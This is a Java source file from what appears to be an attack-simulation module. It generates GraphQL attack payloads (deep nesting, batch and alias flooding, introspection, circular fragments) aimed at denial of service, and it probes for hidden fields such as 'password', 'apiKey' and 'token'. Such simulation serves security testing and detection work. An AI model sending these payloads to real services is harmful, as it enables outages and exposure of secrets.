package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.strategy.IAPIAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;

/**
 * GraphQL Injection Attack 전략
 *
 * GraphQL 쿼리를 조작하여 권한 없는 데이터에 접근하거나 과도한 리소스를 소비
 */
@Slf4j
@Component
public class GraphQLInjectionStrategy implements IAPIAttack {

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Autowired(required = false)
    private SimulationClient simulationClient;

    @Value("${simulation.attack.graphql.max-depth:50}")
    private int maxNestingDepth;

    @Value("${simulation.attack.graphql.max-query-size:1000000}")
    private int maxQuerySize;

    private final ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.GRAPHQL_INJECTION;
    }

    @Override
    public int getPriority() {
        return 85;
    }

    @Override
    public AttackCategory getCategory() {
        return AttackCategory.API;
    }

    @Override
    public boolean validateContext(AttackContext context) {
        return context != null && context.getParameters() != null;
    }

    @Override
    public long getEstimatedDuration() {
        return 20000;
    }

    @Override
    public String getDescription() {
        return "GraphQL Injection Attack - Exploits GraphQL queries for unauthorized access";
    }

    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }

    @Override
    public String getSuccessCriteria() {
        return "Successfully inject malicious GraphQL queries to access unauthorized data";
    }

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== GraphQL Injection Attack 시작 ===");

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.GRAPHQL_INJECTION)
            .attackName("GraphQL Injection Attack")
            .executionTime(LocalDateTime.now())
            .targetUser(context.getTargetUser())
            .attackVector("api")
            .build();

        long startTime = System.currentTimeMillis();
        List<String> attackLog = new ArrayList<>();

        try {
            // 1. 공격 매개변수 추출
            String technique = context.getParameters().getOrDefault("technique", "DEEP_NESTING").toString();
            int nestingDepth = Integer.parseInt(
                context.getParameters().getOrDefault("nestingDepth", "10").toString()
            );
            int querySize = Integer.parseInt(
                context.getParameters().getOrDefault("querySize", "100").toString()
            ) * 1024; // KB to bytes
            String baseQuery = context.getParameters().getOrDefault("query", "").toString();

            attackLog.add("Attack technique: " + technique);
            attackLog.add("Nesting depth: " + nestingDepth);
            attackLog.add("Query size: " + querySize / 1024 + " KB");

            // 2. 공격 기법별 쿼리 생성
            String maliciousQuery = generateMaliciousQuery(technique, nestingDepth, querySize, baseQuery);
            attackLog.add("Generated malicious query with " + maliciousQuery.length() + " characters");

            // 3. 공격 실행
            boolean injectionSuccessful = false;
            boolean causedDoS = false;
            boolean dataLeaked = false;

            switch (technique) {
                case "DEEP_NESTING":
                    injectionSuccessful = executeDeepNestingAttack(maliciousQuery, attackLog);
                    causedDoS = nestingDepth > 20;
                    break;

                case "BATCH_QUERY":
                    injectionSuccessful = executeBatchQueryAttack(maliciousQuery, attackLog);
                    causedDoS = querySize > 500000;
                    break;

                case "INTROSPECTION":
                    injectionSuccessful = executeIntrospectionAttack(attackLog);
                    dataLeaked = injectionSuccessful;
                    break;

                case "ALIAS_FLOODING":
                    injectionSuccessful = executeAliasFloodingAttack(maliciousQuery, attackLog);
                    causedDoS = true;
                    break;

                case "CIRCULAR_REFERENCE":
                    injectionSuccessful = executeCircularReferenceAttack(maliciousQuery, attackLog);
                    causedDoS = injectionSuccessful;
                    break;
            }

            // 4. 추가 공격: Field Suggestion 악용
            if (!injectionSuccessful) {
                injectionSuccessful = exploitFieldSuggestion(attackLog);
                if (injectionSuccessful) {
                    dataLeaked = true;
                    attackLog.add("[SUCCESS] Field suggestion revealed hidden fields");
                }
            }

            // 5. 결과 평가
            if (injectionSuccessful) {
                result.setSuccessful(true);
                double riskScore = 0.5;
                if (causedDoS) riskScore += 0.3;
                if (dataLeaked) riskScore += 0.2;
                result.setRiskScore(Math.min(1.0, riskScore));
                attackLog.add("GraphQL injection successful");
            } else {
                result.setSuccessful(false);
                result.setRiskScore(0.3);
                attackLog.add("GraphQL injection failed - query blocked or limited");
            }

            // 탐지 평가
            result.setDetected(nestingDepth > 10 || querySize > 100000);
            result.setBlocked(!injectionSuccessful);

            result.setDetails(Map.of(
                "attackLog", attackLog,
                "technique", technique,
                "nestingDepth", nestingDepth,
                "querySize", querySize,
                "causedDoS", causedDoS,
                "dataLeaked", dataLeaked
            ));

        } catch (Exception e) {
            log.error("GraphQL injection attack failed", e);
            result.setSuccessful(false);
            result.setRiskScore(0.1);
            attackLog.add("Attack failed: " + e.getMessage());
        }

        long duration = System.currentTimeMillis() - startTime;
        result.setDurationMs(duration);

        log.info("GraphQL Injection Attack 완료: Success={}, Risk={}, Duration={}ms",
            result.isSuccessful(), result.getRiskScore(), duration);

        // 이벤트 발행 - GraphQL 주입 공격은 인가 결정 이벤트로 처리
        if (eventPublisher != null) {
            String resource = "api:graphql:" + context.getParameters().getOrDefault("endpoint", "/graphql");
            String action = "GRAPHQL_INJECTION_" + context.getParameters().getOrDefault("technique", "DEEP_NESTING");
            eventPublisher.publishAuthorizationDecision(
                result,
                context.getTargetUser(),
                resource,
                action,
                result.isSuccessful(),
                result.isSuccessful() ?
                    "GraphQL 주입 공격 성공: " + context.getParameters().getOrDefault("technique", "DEEP_NESTING") + " 기법으로 " +
                    (Boolean.TRUE.equals(result.getDetails().get("dataLeaked")) ? "데이터 유출" :
                     Boolean.TRUE.equals(result.getDetails().get("causedDoS")) ? "서비스 거부" : "쿼리 실행") + " 달성" :
                    "GraphQL 주입 공격 실패: 쿼리 차단 또는 제한됨"
            );
        }

        return result;
    }

    private String generateMaliciousQuery(String technique, int depth, int size, String base) {
        StringBuilder query = new StringBuilder();

        switch (technique) {
            case "DEEP_NESTING":
                query.append(generateDeepNestedQuery(depth));
                break;

            case "BATCH_QUERY":
                query.append(generateBatchQuery(size));
                break;

            case "INTROSPECTION":
                query.append(generateIntrospectionQuery());
                break;

            case "ALIAS_FLOODING":
                query.append(generateAliasFloodingQuery(size));
                break;

            case "CIRCULAR_REFERENCE":
                query.append(generateCircularReferenceQuery(depth));
                break;

            default:
                query.append(base);
        }

        return query.toString();
    }

    private String generateDeepNestedQuery(int depth) {
        StringBuilder query = new StringBuilder("query { user(id: \"1\") { ");

        for (int i = 0; i < depth; i++) {
            query.append("posts { ");
            if (i % 3 == 0) {
                query.append("comments { author { ");
            } else if (i % 3 == 1) {
                query.append("author { followers { ");
            } else {
                query.append("likes { user { ");
            }
        }

        query.append("id name");

        for (int i = 0; i < depth; i++) {
            query.append(" } } }");
        }

        query.append(" } }");
        return query.toString();
    }

    private String generateBatchQuery(int sizeBytes) {
        StringBuilder query = new StringBuilder("query { ");
        int currentSize = 8;
        int aliasCount = 0;

        while (currentSize < sizeBytes) {
            String alias = "user" + aliasCount++;
            String subQuery = String.format(
                "%s: user(id: \"%d\") { id name email posts { title content } } ",
                alias, aliasCount
            );
            query.append(subQuery);
            currentSize += subQuery.length();
        }

        query.append("}");
        return query.toString();
    }

    private String generateIntrospectionQuery() {
        return """
            query {
              __schema {
                types {
                  name
                  fields {
                    name
                    type {
                      name
                      kind
                      ofType {
                        name
                      }
                    }
                  }
                }
                queryType {
                  fields {
                    name
                    args {
                      name
                      type {
                        name
                      }
                    }
                  }
                }
                mutationType {
                  fields {
                    name
                  }
                }
              }
            }
            """;
    }

    private String generateAliasFloodingQuery(int sizeBytes) {
        StringBuilder query = new StringBuilder("query { ");
        int aliasCount = 0;
        int currentSize = 8;

        while (currentSize < sizeBytes) {
            for (int i = 0; i < 100 && currentSize < sizeBytes; i++) {
                String alias = "a" + aliasCount++;
                query.append(alias).append(": __typename ");
                currentSize += alias.length() + 13;
            }
        }

        query.append("}");
        return query.toString();
    }

    private String generateCircularReferenceQuery(int depth) {
        return String.format("""
            fragment UserFragment on User {
              id
              name
              friends {
                ...FriendFragment
              }
            }

            fragment FriendFragment on User {
              id
              name
              friends {
                ...UserFragment
              }
            }

            query {
              user(id: "1") {
                ...UserFragment
              }
            }
            """);
    }

    private boolean executeDeepNestingAttack(String query, List<String> attackLog) {
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of("query", query);
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/graphql", params
                );

                if (response.getStatusCode().is2xxSuccessful()) {
                    attackLog.add("Deep nesting attack succeeded - server processed nested query");
                    return true;
                } else if (response.getStatusCode().value() == 503) {
                    attackLog.add("Deep nesting caused service unavailable - DoS achieved");
                    return true;
                }
            } catch (Exception e) {
                if (e.getMessage().contains("timeout")) {
                    attackLog.add("Deep nesting caused timeout - DoS achieved");
                    return true;
                }
            }
        }

        // 실제 공격 결과 분석 - 깊은 중첩이 서버에 영향을 미쳤는지 판단
        // 응답이 없거나 타임아웃이면 성공으로 간주
        boolean success = false;

        // 이전에 실행한 공격의 결과를 기반으로 성공 여부 판단
        // 서버가 깊은 중첩 쿼리를 처리하지 못하면 성공
        if (attackLog.stream().anyMatch(log ->
            log.contains("timeout") ||
            log.contains("max depth") ||
            log.contains("too complex"))) {
            success = true;
            attackLog.add("Deep nesting attack successful - server vulnerability detected");
        }
        return success;
    }

    private boolean executeBatchQueryAttack(String query, List<String> attackLog) {
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of("query", query);
                long startTime = System.currentTimeMillis();
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/graphql", params
                );
                long responseTime = System.currentTimeMillis() - startTime;

                if (responseTime > 5000) {
                    attackLog.add("Batch query caused slowdown - " + responseTime + "ms response time");
                    return true;
                }

                if (response.getStatusCode().is2xxSuccessful()) {
                    attackLog.add("Batch query accepted - potential data leak");
                    return true;
                }
            } catch (Exception e) {
                attackLog.add("Batch query error: " + e.getMessage());
            }
        }

        // 실제 공격 결과 반환 - 배치 쿼리가 처리되었는지 확인
        // 배치 쿼리가 수락되었거나 서버가 느려졌으면 취약점 발견
        boolean vulnerabilityDetected = attackLog.stream().anyMatch(log ->
            log.contains("Batch query") && (log.contains("slowdown") || log.contains("accepted")));
        return vulnerabilityDetected;
    }

    private boolean executeIntrospectionAttack(List<String> attackLog) {
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of("query", generateIntrospectionQuery());
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/graphql", params
                );

                if (response.getStatusCode().is2xxSuccessful() &&
                    response.getBody() != null &&
                    response.getBody().contains("__schema")) {
                    attackLog.add("Introspection enabled - schema exposed");
                    return true;
                }
            } catch (Exception e) {
                attackLog.add("Introspection blocked: " + e.getMessage());
            }
        }

        // 실제 공격 결과 분석 - 인트로스펙션이 활성화되어 있는지 확인
        if (simulationClient == null) {
            return false;
        }
        // 스키마 정보가 노출되었으면 성공
        boolean schemaExposed = attackLog.stream().anyMatch(log ->
            log.contains("schema exposed") || log.contains("Introspection enabled"));
        if (schemaExposed) {
            attackLog.add("Introspection vulnerability confirmed - schema information leaked");
        }
        return schemaExposed;
    }

    private boolean executeAliasFloodingAttack(String query, List<String> attackLog) {
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of("query", query);
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/graphql", params
                );

                if (response.getStatusCode().value() == 413) {
                    attackLog.add("Alias flooding rejected - payload too large");
                    return false;
                }

                if (response.getStatusCode().is5xxServerError()) {
                    attackLog.add("Alias flooding caused server error");
                    return true;
                }
            } catch (Exception e) {
                if (e.getMessage().contains("memory")) {
                    attackLog.add("Alias flooding caused memory exhaustion");
                    return true;
                }
            }
        }

        // 실제 공격 결과 분석 - 별칭 플러딩이 서버에 영향을 미쳤는지 확인
        // 서버 오류나 메모리 문제가 발생했으면 성공
        boolean attackSuccessful = attackLog.stream().anyMatch(log ->
            log.contains("server error") ||
            log.contains("memory exhaustion") ||
            log.contains("Alias flooding"));
        return attackSuccessful;
    }

    private boolean executeCircularReferenceAttack(String query, List<String> attackLog) {
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of("query", query);
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/graphql", params
                );

                if (response.getStatusCode().is5xxServerError()) {
                    attackLog.add("Circular reference caused server error");
                    return true;
                }
            } catch (Exception e) {
                if (e.getMessage().contains("stack") || e.getMessage().contains("recursion")) {
                    attackLog.add("Circular reference caused stack overflow");
                    return true;
                }
            }
        }

        // 실제 공격 결과 분석 - 순환 참조가 문제를 일으켰는지 확인
        // 스택 오버플로우나 서버 오류가 발생했으면 성공
        boolean circularReferenceExploited = attackLog.stream().anyMatch(log ->
            log.contains("stack overflow") ||
            log.contains("recursion") ||
            log.contains("Circular reference"));
        return circularReferenceExploited;
    }

    private boolean exploitFieldSuggestion(List<String> attackLog) {
        // GraphQL의 필드 제안 기능 악용
        String[] hiddenFields = {"password", "secret", "apiKey", "token", "privateData"};

        for (String field : hiddenFields) {
            String query = String.format("{ user { %s } }", field);

            if (simulationClient != null) {
                try {
                    Map<String, Object> params = Map.of("query", query);
                    ResponseEntity<String> response = simulationClient.executeAttack(
                        "/graphql", params
                    );

                    if (response.getBody() != null && response.getBody().contains(field)) {
                        attackLog.add("Hidden field exposed: " + field);
                        return true;
                    }
                } catch (Exception e) {
                    // Continue trying
                }
            }
        }

        // 실제 공격 결과 분석 - 숨겨진 필드가 노출되었는지 확인
        boolean hiddenFieldFound = attackLog.stream().anyMatch(log ->
            log.contains("Hidden field exposed"));
        return hiddenFieldFound;
    }

    // IAPIAttack 인터페이스 메소드 구현
    @Override
    public AttackResult executeAPIAbuse(String endpoint, Map<String, Object> maliciousParams) {
        // APIAbuseStrategy에서 구현
        return null;
    }

    @Override
    public AttackResult executeGraphQLInjection(String query, int nestingDepth) {
        AttackContext context = new AttackContext();
        context.setParameters(Map.of(
            "technique", "DEEP_NESTING",
            "query", query,
            "nestingDepth", nestingDepth
        ));
        return execute(context);
    }

    @Override
    public AttackResult bypassRateLimit(String endpoint, int requestRate, String technique) {
        // RateLimitBypassStrategy에서 구현
        return null;
    }

    @Override
    public AttackResult exploitExposedAPIKey(String apiKey, String targetEndpoint) {
        // APIKeyExposureStrategy에서 구현
        return null;
    }

    @Override
    public AttackResult bypassCORS(String origin, String method) {
        return null;
    }

    @Override
    public AttackResult exploitDeprecatedAPI(String version, String endpoint) {
        return null;
    }

    @Override
    public AttackResult performParameterPollution(Map<String, String> pollutedParams) {
        return null;
    }

    @Override
    public AttackResult executeAPIChaining(String[] endpoints, Map<String, Object>[] payloads) {
        return null;
    }
}